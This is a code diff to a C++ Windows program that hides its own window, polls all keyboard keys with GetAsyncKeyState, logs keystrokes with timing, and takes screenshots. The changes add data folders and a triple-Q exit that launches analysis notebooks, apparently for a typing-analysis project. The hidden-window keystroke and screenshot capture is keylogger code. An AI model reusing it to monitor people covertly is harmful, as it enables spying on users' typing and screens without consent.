@@ -13,6 +13,7 @@
 #include <utility>
 #include <python.h>
 #include <conio.h>
+#include <direct.h>
 
 
 using namespace std;
@@ -23,6 +24,7 @@ bool flag;
 int BackspaceCounter = 0;
 
 void screenshot(){
+	cout << 111;
 	system("python3 screenshot.py");
 }
 
@@ -631,9 +633,21 @@ void stealth() {
 	ShowWindow(stealth, 0);
 }
 
+void creat_directory() {
+	ofstream ofs;
+	_mkdir("../data");
+	_mkdir("../data/screenshots");
+	_mkdir("../data/processed_images");
+	ofs.open("buffer.txt", ofstream::out | ofstream::trunc);
+	ofs << 1;
+	ofs.close();
+}
+
 int main(int argc, char* argv[]) {
 	stealth();
+	creat_directory();
 	char i;
+	int break_q = 0;
 	bool flag;
 	DWORD dwStart, dwPeriod;
 	auto start = chrono::system_clock::now();
@@ -642,6 +656,21 @@ int main(int argc, char* argv[]) {
 		for (i = 8; i <= 190; i++) {
 			if (GetAsyncKeyState(i) == -32767) {
 				flag = true;
+				if (i == 81) {
+					break_q++;
+					if (break_q >= 3) {
+						system("python3 ../analysis/analysis_images.py");
+						Sleep(3000);
+						system("jupyter notebook ../analysis/model.ipynb");
+						Sleep(5000);
+						system("jupyter notebook ../analysis/report.ipynb");
+						Sleep(4000);
+						exit(0);
+					}
+			    }
+			    else {
+				     break_q = 0;
+			    }
 				break;
 			}
 		}
@@ -656,5 +685,6 @@ int main(int argc, char* argv[]) {
 			SaveFile(i, dwPeriod, elapsed_seconds.count());
 		}
 	}
+	
 	return 0;
 }
